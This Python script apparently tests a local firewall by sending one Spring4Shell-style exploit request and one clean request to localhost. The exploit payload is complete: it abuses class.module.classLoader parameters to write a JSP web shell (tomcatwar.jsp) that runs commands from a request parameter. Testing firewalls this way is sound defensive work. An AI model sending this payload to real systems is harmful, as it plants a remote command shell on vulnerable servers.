import requests

# URL of your local firewall server
url = "http://localhost:8000/tomcatwar.jsp"

# Malicious payload (Spring4Shell-style)
malicious_data = {
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))) { java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i",
    "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
    "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
    "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "tomcatwar",
    "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
}

malicious_headers = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Send malicious request
response = requests.post(url, data=malicious_data, headers=malicious_headers)
print(f"Malicious request response: {response.status_code} - {response.text}")

# Clean request to a safe path
clean_url = "http://localhost:8000/safe"
clean_data = {"username": "michael", "message": "hello"}
clean_headers = {"Content-Type": "application/x-www-form-urlencoded"}

response = requests.post(clean_url, data=clean_data, headers=clean_headers)
print(f"Clean request response: {response.status_code} - {response.text}")